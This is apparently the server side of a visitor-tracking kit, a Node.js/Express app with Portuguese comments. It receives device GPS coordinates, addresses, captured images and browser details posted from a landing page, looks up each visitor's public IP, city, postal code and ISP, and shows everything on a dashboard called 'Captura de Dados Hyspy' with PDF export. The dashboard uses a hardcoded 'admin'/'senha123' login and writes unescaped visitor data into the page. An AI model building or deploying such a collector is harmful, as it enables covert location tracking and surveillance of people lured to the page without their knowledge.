// ========== AUTENTICAÇÃO ==========
const auth = require('basic-auth');

function autenticar(req, res, next) {
  const usuario = auth(req);
  const usuarioValido = 'admin';
  const senhaValida = 'senha123';

  if (!usuario || usuario.name !== usuarioValido || usuario.pass !== senhaValida) {
    res.set('WWW-Authenticate', 'Basic realm="Dashboard Protegido"');
    return res.status(401).send('Acesso negado – autenticação necessária.');
  }

  next();
}

// ========== DEPENDÊNCIAS ==========
const axios = require('axios');
const express = require('express');
const fs = require('fs');
const path = require('path');
const https = require('https');

const app = express();
app.use(express.static(path.join(__dirname, 'public')));

app.use(express.json({ limit: '10mb' }));

// Configurar proxy trust para melhor detecção de IP
app.set('trust proxy', true);

// ========== ARMAZENAMENTO ==========
let dadosRecebidos = [];

// ========== FUNÇÃO MELHORADA PARA OBTER IP PÚBLICO REAL ==========
async function obterIPPublicoReal(req) {
  try {
    console.log('🔍 Iniciando captura de IP público...');
    
    // Capturar todos os possíveis IPs do cliente
    const ips = {
      xForwardedFor: req.headers['x-forwarded-for'],
      xRealIP: req.headers['x-real-ip'],
      xClientIP: req.headers['x-client-ip'],
      remoteAddress: req.connection?.remoteAddress,
      socketAddress: req.socket?.remoteAddress,
      connectionSocket: req.connection?.socket?.remoteAddress,
      reqIP: req.ip,
      cfConnectingIP: req.headers['cf-connecting-ip'], // Cloudflare
      trueClientIP: req.headers['true-client-ip'], // Akamai/outros CDNs
      forwarded: req.headers['forwarded']
    };

    console.log('📋 IPs detectados:', ips);

    // Pegar o primeiro IP válido da cadeia x-forwarded-for
    let clientIP = null;
    if (ips.xForwardedFor) {
      clientIP = ips.xForwardedFor.split(',')[0].trim();
    } else if (ips.cfConnectingIP) {
      clientIP = ips.cfConnectingIP;
    } else if (ips.trueClientIP) {
      clientIP = ips.trueClientIP;
    } else if (ips.xRealIP) {
      clientIP = ips.xRealIP;
    } else if (ips.xClientIP) {
      clientIP = ips.xClientIP;
    } else {
      clientIP = ips.remoteAddress || ips.socketAddress || ips.connectionSocket || ips.reqIP;
    }

    // Limpar IPv6 mapeado para IPv4
    if (clientIP && clientIP.startsWith('::ffff:')) {
      clientIP = clientIP.substring(7);
    }

    console.log('🎯 IP inicial detectado:', clientIP);

    let ipPublicoReal = clientIP;
    let dadosGeoIP = {};

    // Verificar se é IP privado/local
    const isPrivateIP = clientIP && (
      clientIP.startsWith('192.168.') || 
      clientIP.startsWith('10.') || 
      clientIP.startsWith('172.') || 
      clientIP === '127.0.0.1' || 
      clientIP === '::1' ||
      clientIP === 'localhost' ||
      clientIP.startsWith('169.254.') // Link-local
    );

    console.log('🏠 É IP privado?', isPrivateIP);

    // SEMPRE tentar obter IP público real via serviços externos
    try {
      console.log('🌐 Buscando IP público via serviços externos...');
      
      const servicos = [
        'https://api.ipify.org?format=json',
        'https://httpbin.org/ip',
        'https://api64.ipify.org?format=json',
        'https://ipapi.co/ip/',
        'https://checkip.amazonaws.com',
        'https://icanhazip.com',
        'https://ident.me',
        'https://ifconfig.me/ip',
        'https://myexternalip.com/raw',
        'https://wtfismyip.com/text'
      ];

      for (const servico of servicos) {
        try {
          console.log(`📡 Testando serviço: ${servico}`);
          const response = await axios.get(servico, { 
            timeout: 5000,
            headers: {
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
          });
          
          let ip = null;
          
          // Diferentes formatos de resposta
          if (response.data.ip) {
            ip = response.data.ip;
          } else if (response.data.origin) {
            ip = response.data.origin;
          } else if (typeof response.data === 'string') {
            ip = response.data.trim();
          }
          
          if (ip && ip !== clientIP && !ip.startsWith('192.168.') && !ip.startsWith('10.') && !ip.startsWith('172.')) {
            ipPublicoReal = ip;
            console.log('✅ IP público encontrado:', ipPublicoReal);
            break;
          }
        } catch (err) {
          console.log(`❌ Falha no serviço ${servico}:`, err.message);
          continue;
        }
      }
    } catch (err) {
      console.log('⚠️ Erro geral ao buscar IP público:', err.message);
    }

    // Obter informações geográficas e de provedor com múltiplos serviços
    try {
      console.log('🗺️ Buscando dados geográficos para IP:', ipPublicoReal);
      
      const servicosGeo = [
        `http://ip-api.com/json/${ipPublicoReal}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`,
        `https://ipapi.co/${ipPublicoReal}/json/`,
        `http://www.geoplugin.net/json.gp?ip=${ipPublicoReal}`
      ];

      for (const servicoGeo of servicosGeo) {
        try {
          const geoResponse = await axios.get(servicoGeo, { timeout: 8000 });
          
          if (geoResponse.data.status === 'success' || geoResponse.data.country) {
            // Normalizar dados de diferentes APIs
            dadosGeoIP = {
              country: geoResponse.data.country || geoResponse.data.geoplugin_countryName,
              countryCode: geoResponse.data.countryCode || geoResponse.data.country_code || geoResponse.data.geoplugin_countryCode,
              region: geoResponse.data.region || geoResponse.data.region_code,
              regionName: geoResponse.data.regionName || geoResponse.data.region || geoResponse.data.geoplugin_region,
              city: geoResponse.data.city || geoResponse.data.geoplugin_city,
              zip: geoResponse.data.zip || geoResponse.data.postal,
              lat: geoResponse.data.lat || geoResponse.data.latitude || geoResponse.data.geoplugin_latitude,
              lon: geoResponse.data.lon || geoResponse.data.longitude || geoResponse.data.geoplugin_longitude,
              timezone: geoResponse.data.timezone || geoResponse.data.geoplugin_timezone,
              isp: geoResponse.data.isp || geoResponse.data.org || geoResponse.data.geoplugin_isp,
              org: geoResponse.data.org || geoResponse.data.organization,
              as: geoResponse.data.as
            };
            console.log('✅ Dados geográficos obtidos:', dadosGeoIP);
            break;
          }
        } catch (err) {
          console.log(`❌ Erro no serviço geo ${servicoGeo}:`, err.message);
          continue;
        }
      }
    } catch (err) {
      console.log('⚠️ Erro ao buscar dados geográficos:', err.message);
    }

    const resultado = {
      ipOriginal: clientIP,
      ipPublico: ipPublicoReal,
      ipPublicoOperadora: ipPublicoReal, // Este é o IP fornecido pela operadora
      ipv4: (clientIP && clientIP.includes('.')) ? clientIP : 'Não detectado',
      ipv6: (clientIP && clientIP.includes(':') && !clientIP.startsWith('::ffff:')) ? clientIP : 'Não detectado',
      todosIPs: ips,
      ehIPPrivado: isPrivateIP,
      geolocalizacao: {
        pais: dadosGeoIP.country || 'Não informado',
        codigoPais: dadosGeoIP.countryCode || 'N/A',
        estado: dadosGeoIP.regionName || 'Não informado',
        cidade: dadosGeoIP.city || 'Não informado',
        cep: dadosGeoIP.zip || 'Não informado',
        latitude: dadosGeoIP.lat || null,
        longitude: dadosGeoIP.lon || null,
        timezone: dadosGeoIP.timezone || 'Não informado'
      },
      provedor: {
        isp: dadosGeoIP.isp || 'Desconhecido',
        organizacao: dadosGeoIP.org || 'Desconhecida',
        sistemaAutonomo: dadosGeoIP.as || 'Não informado'
      }
    };

    console.log('🎉 Resultado final da captura de IP:', resultado);
    return resultado;

  } catch (err) {
    console.error('💥 Erro crítico na captura de IP:', err.message);
    return {
      ipOriginal: 'Erro na captura',
      ipPublico: 'Erro na captura',
      ipPublicoOperadora: 'Erro na captura',
      ipv4: 'Erro',
      ipv6: 'Erro',
      todosIPs: {},
      ehIPPrivado: null,
      geolocalizacao: {
        pais: 'Erro',
        codigoPais: 'Erro',
        estado: 'Erro', 
        cidade: 'Erro',
        cep: 'Erro',
        latitude: null,
        longitude: null,
        timezone: 'Erro'
      },
      provedor: {
        isp: 'Erro',
        organizacao: 'Erro',
        sistemaAutonomo: 'Erro'
      }
    };
  }
}

// ========== ROTA DE CAPTURA ==========
app.post('/dados', async (req, res) => {
  console.log('📥 Nova captura recebida');
  const { latitude, longitude, endereco, imagem, sistema, navegador } = req.body;

  let fileName = null;
  if (imagem) {
    fileName = `captura_${Date.now()}.png`;
    const base64Data = imagem.replace(/^data:image\/png;base64,/, "");
    fs.writeFileSync(path.join(__dirname, fileName), base64Data, 'base64');
    console.log('📸 Imagem salva:', fileName);
  }

  // Captura completa de IP público real
  const dadosIP = await obterIPPublicoReal(req);

  const registro = {
    latitude,
    longitude,
    endereco,
    sistema,
    navegador,
    imagem: fileName,
    horario: new Date().toLocaleString(),
    
    // Dados de IP expandidos
    ipOriginal: dadosIP.ipOriginal,
    ipPublico: dadosIP.ipPublico,
    ipPublicoOperadora: dadosIP.ipPublicoOperadora,
    ipv4: dadosIP.ipv4,
    ipv6: dadosIP.ipv6,
    ehIPPrivado: dadosIP.ehIPPrivado,
    
    // Dados geográficos do IP público
    pais: dadosIP.geolocalizacao.pais,
    codigoPais: dadosIP.geolocalizacao.codigoPais,
    estado: dadosIP.geolocalizacao.estado,
    cidade: dadosIP.geolocalizacao.cidade,
    cep: dadosIP.geolocalizacao.cep,
    latitudeIP: dadosIP.geolocalizacao.latitude,
    longitudeIP: dadosIP.geolocalizacao.longitude,
    timezone: dadosIP.geolocalizacao.timezone,
    
    // Dados do provedor/operadora
    operadora: dadosIP.provedor.isp,
    organizacao: dadosIP.provedor.organizacao,
    sistemaAutonomo: dadosIP.provedor.as,
    
    // Dados técnicos completos
    todosIPs: dadosIP.todosIPs
  };

  dadosRecebidos.push(registro);
  console.log('✅ Registro salvo com IP público:', registro.ipPublicoOperadora);
  res.send('Dados recebidos com sucesso!');
});

// ========== ROTA DE ACESSO VIA INDEX ==========
app.post('/acesso', async (req, res) => {
  console.log('👀 Novo acesso via index');
  const horario = new Date().toLocaleString();
  
  // Captura completa de IP público real
  const dadosIP = await obterIPPublicoReal(req);

  const registro = {
    horario,
    origem: 'index.html',
    sistema: req.headers['user-agent'],
    
    // Dados de IP expandidos
    ipOriginal: dadosIP.ipOriginal,
    ipPublico: dadosIP.ipPublico,
    ipPublicoOperadora: dadosIP.ipPublicoOperadora,
    ipv4: dadosIP.ipv4,
    ipv6: dadosIP.ipv6,
    ehIPPrivado: dadosIP.ehIPPrivado,
    
    // Dados geográficos do IP público
    pais: dadosIP.geolocalizacao.pais,
    codigoPais: dadosIP.geolocalizacao.codigoPais,
    estado: dadosIP.geolocalizacao.estado,
    cidade: dadosIP.geolocalizacao.cidade,
    cep: dadosIP.geolocalizacao.cep,
    latitudeIP: dadosIP.geolocalizacao.latitude,
    longitudeIP: dadosIP.geolocalizacao.longitude,
    timezone: dadosIP.geolocalizacao.timezone,
    
    // Dados do provedor/operadora
    operadora: dadosIP.provedor.isp,
    organizacao: dadosIP.provedor.organizacao,
    sistemaAutonomo: dadosIP.provedor.as,
    
    // Dados técnicos completos
    todosIPs: dadosIP.todosIPs
  };

  dadosRecebidos.push(registro);
  console.log('✅ Acesso registrado com IP público:', registro.ipPublicoOperadora);
  res.sendStatus(200);
});

// ========== ROTA JSON PARA FRONT ==========
app.get('/dados-json', autenticar, (req, res) => {
  res.json(dadosRecebidos);
});

// ========== DASHBOARD HTML DINÂMICO MELHORADO ==========
app.get('/dashboard', autenticar, (req, res) => {
  const total = dadosRecebidos.length;
  const ultimo = total > 0 ? dadosRecebidos[total - 1] : null;

  let html = `
    <!DOCTYPE html>
    <html lang="pt-BR">
    <head>
      <meta charset="UTF-8">
      <title>Dashboard - Captura de Dados Hyspy</title>
      <style>
        body {
          font-family: 'Segoe UI', sans-serif;
          background: #121212;
          margin: 0;
          padding: 30px;
          color: #f0f0f0;
        }
        h1 {
          color: #e0d4f7;
          font-size: 2.5em;
          margin-bottom: 10px;
        }
        .container {
          max-width: 1200px;
          margin: auto;
        }
        .stats {
          background: #1e1e1e;
          padding: 20px;
          border-radius: 10px;
          box-shadow: 0 2px 10px rgba(255,255,255,0.05);
          margin-bottom: 30px;
          display: grid;
          grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
          gap: 20px;
        }
        .card {
          background: #1e1e1e;
          padding: 20px;
          border-radius: 10px;
          box-shadow: 0 2px 10px rgba(255,255,255,0.05);
          margin-bottom: 30px;
        }
        .card h2 {
          color: #e0d4f7;
          margin-top: 0;
        }
        .info {
          margin: 10px 0;
        }
        .label {
          font-weight: bold;
          color: #c0aaff;
        }
        img {
          max-width: 100%;
          border-radius: 8px;
          margin-top: 10px;
          box-shadow: 0 0 5px rgba(255,255,255,0.2);
        }
      </style>
    </head>
    <body>
      <div class="container">
        <h1>📊 Dashboard de Capturas - IP Público Real</h1>
        
        <div style="margin-bottom: 20px;">
          <button class="export-btn" onclick="exportarPDF()">📄 Exportar para PDF</button>
          <button class="refresh-btn" onclick="atualizarDashboard()">🔄 Atualizar</button>
        </div>
        
        <div class="stats" id="stats"></div>
        <div id="dashboard-container"></div>
      </div>

      <script>
        let dadosGlobais = [];

        async function atualizarDashboard() {
          try {
            const res = await fetch('/dados-json');
            const dados = await res.json();
            dadosGlobais = dados;

            const total = dados.length;
            const capturas = dados.filter(d => d.imagem).length;
            const acessos = dados.filter(d => d.origem === 'index.html').length;
            const ipsUnicos = [...new Set(dados.map(d => d.ipPublicoOperadora))].length;
            const ultimo = total > 0 ? dados[total - 1].horario : '';

            document.getElementById('stats').innerHTML = \`
              <div class="stat-card">
                <div class="stat-number">\${total}</div>
                <div>Total de Registros</div>
              </div>
              <div class="stat-card">
                <div class="stat-number">\${capturas}</div>
                <div>Capturas Completas</div>
              </div>
              <div class="stat-card">
                <div class="stat-number">\${acessos}</div>
                <div>Acessos Simples</div>
              </div>
              <div class="stat-card">
                <div class="stat-number">\${ipsUnicos}</div>
                <div>IPs Únicos</div>
              </div>
              \${ultimo ? \`
              <div class="stat-card">
                <div style="font-size: 0.9em;">Último Acesso</div>
                <div style="font-size: 0.8em; color: #c0aaff;">\${ultimo}</div>
              </div>
              \` : ''}
            \`;

            const html = dados.slice().reverse().map((dado, index) => \`
             <div class="card">
                <h2>
                  <span class="status-indicator online"></span>
                  📥 \${dado.origem === 'index.html' ? 'Acesso' : 'Captura'} \${index + 1}
                </h2>
                
                <div class="section">
                  <h3>📍 Informações Básicas</h3>
                  <div class="info"><span class="label">Horário:</span> <span class="value">\${dado.horario}</span></div>
                  <div class="info"><span class="label">Origem:</span> <span class="value">\${dado.origem || 'Captura completa'}</span></div>
                  <div class="info"><span class="label">Sistema:</span> <span class="value">\${dado.sistema}</span></div>
                  <div class="info"><span class="label">Navegador:</span> <span class="value">\${dado.navegador || 'Não informado'}</span></div>
                </div>

                <div class="section ip-section">
                  <h3>🌐 IP Público da Operadora</h3>
                  <div class="info">
                    <span class="label">IP Público Real:</span> 
                    <span class="ip-public">\${dado.ipPublicoOperadora || dado.ipPublico || 'Não capturado'}</span>
                    \${dado.ehIPPrivado ? '<span class="highlight">Convertido de IP Privado</span>' : '<span class="highlight">IP Direto</span>'}
                  </div>
                  <div class="info"><span class="label">IP Original Detectado:</span> <span class="value">\${dado.ipOriginal || 'Não informado'}</span></div>
                  <div class="info"><span class="label">IPv4:</span> <span class="value">\${dado.ipv4 || 'Não detectado'}</span></div>
                  <div class="info"><span class="label">IPv6:</span> <span class="value">\${dado.ipv6 || 'Não detectado'}</span></div>
                </div>

                <div class="section geo-section">
                  <h3>🗺️ Localização por IP Público</h3>
                  <div class="info"><span class="label">País:</span> <span class="value">\${dado.pais || 'Não informado'} \${dado.codigoPais ? '(' + dado.codigoPais + ')' : ''}</span></div>
                  <div class="info"><span class="label">Estado/Região:</span> <span class="value">\${dado.estado || 'Não informado'}</span></div>
                  <div class="info"><span class="label">Cidade:</span> <span class="value">\${dado.cidade || 'Não informado'}</span></div>
                  <div class="info"><span class="label">CEP:</span> <span class="value">\${dado.cep || 'Não informado'}</span></div>
                  <div class="info"><span class="label">Coordenadas do IP:</span> <span class="value">\${dado.latitudeIP && dado.longitudeIP ? dado.latitudeIP + ', ' + dado.longitudeIP : 'Não disponível'}</span></div>
                  <div class="info"><span class="label">Fuso Horário:</span> <span class="value">\${dado.timezone || 'Não informado'}</span></div>
                </div>

                <div class="section provider-section">
                  <h3>📡 Dados da Operadora/ISP</h3>
                  <div class="info"><span class="label">Operadora Principal:</span> <span class="highlight">\${dado.operadora || 'Desconhecida'}</span></div>
                  <div class="info"><span class="label">Organização:</span> <span class="value">\${dado.organizacao || 'Não informada'}</span></div>
                  <div class="info"><span class="label">Sistema Autônomo:</span> <span class="value">\${dado.sistemaAutonomo || 'Não informado'}</span></div>
                </div>

                \${dado.endereco || dado.latitude ? \`
                <div class="section">
                  <h3>📍 Localização Precisa (GPS do Dispositivo)</h3>
                  <div class="info"><span class="label">Endereço GPS:</span> <span class="value">\${dado.endereco || 'Não informado'}</span></div>
                  <div class="info"><span class="label">Coordenadas GPS:</span> <span class="value">\${dado.latitude && dado.longitude ? dado.latitude + ', ' + dado.longitude : 'Não disponível'}</span></div>
                </div>
                \` : ''}

                \${dado.imagem ? \`
                <div class="section">
                  <h3>📸 Captura de Tela</h3>
                  <img src="/\${dado.imagem}" alt="Captura" loading="lazy">
                </div>
                \` : ''}
              </div>
            \`).join('');

            document.getElementById('dashboard-container').innerHTML = html;
            console.log('✅ Dashboard atualizado com', total, 'registros');
          } catch (err) {
            console.error('❌ Erro ao carregar dados:', err);
          }
        }

        function exportarPDF() {
          const { jsPDF } = window.jspdf;
          const doc = new jsPDF();
          
          doc.setFontSize(20);
          doc.text('Dashboard - Igreja Esperança Viva', 20, 20);
          doc.setFontSize(12);
          doc.text('Relatório de IPs Públicos e Capturas', 20, 30);
          
          let yPosition = 45;
          
          dadosGlobais.forEach((dado, index) => {
            if (yPosition > 240) {
              doc.addPage();
              yPosition = 20;
            }
            
            doc.setFontSize(14);
            doc.text(\`\${dado.origem === 'index.html' ? 'Acesso' : 'Captura'} \${index + 1}\`, 20, yPosition);
            yPosition += 8;
            
            doc.setFontSize(9);
            doc.text(\`Horário: \${dado.horario}\`, 20, yPosition); yPosition += 5;
            doc.text(\`IP Público da Operadora: \${dado.ipPublicoOperadora || 'N/A'}\`, 20, yPosition); yPosition += 5;
            doc.text(\`IP Original: \${dado.ipOriginal || 'N/A'}\`, 20, yPosition); yPosition += 5;
            doc.text(\`País: \${dado.pais || 'N/A'} | Estado: \${dado.estado || 'N/A'}\`, 20, yPosition); yPosition += 5;
            doc.text(\`Cidade: \${dado.cidade || 'N/A'} | CEP: \${dado.cep || 'N/A'}\`, 20, yPosition); yPosition += 5;
            doc.text(\`Operadora: \${dado.operadora || 'N/A'}\`, 20, yPosition); yPosition += 5;
            doc.text(\`Organização: \${dado.organizacao || 'N/A'}\`, 20, yPosition); yPosition += 5;
            doc.text(\`Sistema: \${dado.sistema ? dado.sistema.substring(0, 80) + '...' : 'N/A'}\`, 20, yPosition); yPosition += 10;
          });
          
          doc.save(\`dashboard-ips-publicos-\${new Date().getTime()}.pdf\`);
          console.log('📄 PDF exportado com sucesso!');
        }

        // Auto-atualização a cada 15 segundos
        setInterval(atualizarDashboard, 15000);
        
        // Carregar dados iniciais
        atualizarDashboard();
        
        console.log('🚀 Dashboard carregado e funcionando!');
      </script>
    </body>
    </html>
  `;

  res.send(html);
});

// ========== ROTA DE TESTE DE IP ==========
app.get('/meu-ip', async (req, res) => {
  console.log('🔍 Teste de IP solicitado');
  const dadosIP = await obterIPPublicoReal(req);
  res.json({
    message: 'Seu IP público da operadora',
    dados: dadosIP
  });
});

// ========== MIDDLEWARE DE LOG ==========
app.use((req, res, next) => {
  console.log(`📝 ${new Date().toLocaleString()} - ${req.method} ${req.path} - IP: ${req.ip}`);
  next();
});

// ========== TRATAMENTO DE ERROS ==========
app.use((err, req, res, next) => {
  console.error('💥 Erro no servidor:', err.message);
  res.status(500).json({ error: 'Erro interno do servidor' });
});

// ========== ROTA RAIZ ==========
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// ========== CONFIGURAÇÃO HTTPS ==========
const options = {
  key: fs.readFileSync('key.pem'),
  cert: fs.readFileSync('cert.pem')
};

// ========== INICIALIZAÇÃO DO SERVIDOR ==========
https.createServer(options, app).listen(3000, () => {
  console.log('🔒 Servidor HTTPS rodando na porta 3000');
  console.log('🌐 Acesse: https://localhost:3000');
  console.log('📊 Dashboard: https://localhost:3000/dashboard');
  console.log('🔍 Teste de IP: https://localhost:3000/meu-ip');
  console.log('✅ Sistema de captura de IP público ativo!');
});